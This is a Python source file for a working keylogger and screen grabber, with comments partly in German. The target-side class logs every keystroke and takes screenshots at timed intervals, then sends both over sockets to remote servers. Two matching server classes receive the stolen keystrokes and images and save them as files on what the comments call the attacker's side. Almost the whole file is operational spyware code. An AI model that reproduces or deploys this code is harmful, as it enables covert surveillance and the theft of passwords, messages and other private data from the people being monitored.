from pynput import keyboard
import time
import sys
import socket
import pyautogui as pg
import subprocess
import os
import math


def client(ip_photos, port_photos):
    global fhandle
    # fhandle is the variable which opens the foto
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_photos, port_photos))
    # This connects to the server you specified
    image = pg.screenshot()
    # "image" screenshots the current image after a specific time
    fotoname = f"Photo.png"
    # Name of the image
    image.save(fotoname)
    # Saves the image in the current directory
    fhandle = open(fotoname, "rb")
    # Opens the image

    full_msg = b""
    # Every image information will be stored in "full_msg"
    for line in fhandle:
        full_msg += line

    s.send(full_msg)


def countdown_send(zeit, ip_photos, port_photos, ip_keylogger, port_keylogger):
    seconds_list = [zahl for zahl in range(0, zeit + 1, 60) if zahl != 0]
    # The seconds the image will be sent in 60 steps to the server will be saved in "seconds_list"
    seconds_list = seconds_list + [20, 40]
    # The image will always be sent at the 20th and the 40th second so if the client suddenly dies some data will still be sent
    print(seconds_list)
    for x in range(zeit + 1):
        print(x)
        zeit -= 1
        time.sleep(1)
        if x in seconds_list:
            client(ip_photos, port_photos)
            # The images will be sent

    key_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    key_data.connect((ip_keylogger, port_keylogger))
    # This is the ip and the port of the server the port shouldn't be the same the server_photos and the server_keylogger shouldn't be
    # in the same folder

    wort = ""
    for zeichen in richtige_liste:
        wort += zeichen

    # Sends the data to server_keylogger
    key_data.send(wort.encode())
    print(wort)
    print(richtige_liste)
    fhandle.close()
    # Closes the image
    os.remove("Foto.png")
    # Deletes the image in the current directory
    sys.exit()
    # Stops the keylogger


richtige_liste = []


def on_press(key):
    global richtige_liste
    try:
        print(f'Alphabetische Taste wurde gedrückt: {key.char} ')
        richtige_liste += key.char
        # Every pressed key will be saved in "richtige_liste" this is a german word and means "right_list"

        print(richtige_liste)
    except AttributeError:
        print(f'Eine andere Taste wurde gedrückt: {key}')
        if key == keyboard.Key.space or key == keyboard.Key.tab:
            richtige_liste += "{"
            # If the target presses tab or space a "{" will be appended to the list so the attacker knows when and
            # space or a tab key has been pressed


def on_release(key):
    print(f'Key released: {key}')


class KeyloggerTarget:
    def __init__(self, ip_of_server_photos, port_of_server_photos, ip_of_server_keylogger_data,
                 port_of_server_keylogger_data, duration_in_seconds=200):
        # "duration_in_seconds" tells the programm how long it should last the default time is 200 seconds that's 3 Minutes and 20 Seconds
        self.ip_photos = ip_of_server_photos
        self.port_photos = port_of_server_photos
        self.ip_keylogger = ip_of_server_keylogger_data
        self.port_keylogger = port_of_server_keylogger_data
        self.duration = duration_in_seconds

    def start(self):
        if self.duration < 60:
            raise TypeError(f"{self.duration} is not greater and not equal to 60")
        # "duration_in_seconds" should always be bigger than 60 seconds
        else:
            with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
                countdown_send(self.duration, self.ip_photos, self.port_photos, self.ip_keylogger, self.port_keylogger)
                listener.join()
                # This listens to the keys that where typed


class ServerKeylogger:
    # This is the class of the Server. Both Server should not be in the same file
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.ip, self.port))
        server.listen(5)

        print("Waiting for connection....")
        clientsocket, ipaddress = server.accept()
        # Data is in clientsocket and the ip-address is obviously in "ipaddress"
        print(f"Connection has been established with {ipaddress}")

        full_msg = ""
        while True:
            msg = clientsocket.recv(200).decode()

            if len(msg) <= 0: break
            full_msg += msg

        for zeichen in full_msg:
            if "{" == zeichen:
                # "{" this detects if a space or a tab is in full_msg
                full_msg = full_msg.replace("{", " ")
        # The data is being stored in full_msg
        print(full_msg)
        zeit = time.strftime("%H-%M-%S  -%Y")
        # This is the time the data has arrived
        with open(f"Keylogger of the ip {ipaddress} Time {zeit}.txt", "a+", encoding="utf-8") as file:
            file.write(f"Here is everything the target was typing \n\n{full_msg}")


class ServerPhotos:
    # This is the class of the Server. Both Server should not be in the same file
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.ip, self.port))
        server.listen(5)

        anzahl = 1
        while True:
            print("Waiting for connection...")
            client_socket, address = server.accept()
            # Data is in client_socket and the address is obviously in "ipaddress"
            full_msg = b""
            # All the binary data is being stored in full_msg as in the previous classes
            while True:
                msg = client_socket.recv(200)
                if len(msg) <= 0: break
                full_msg += msg

            client_socket.close()
            with open(f"New_Image ({anzahl}).png", "wb") as file:
                # This stores the image
                file.write(full_msg)

            anzahl += 1
            # "anzahl" is for the amount of photos
            print(full_msg)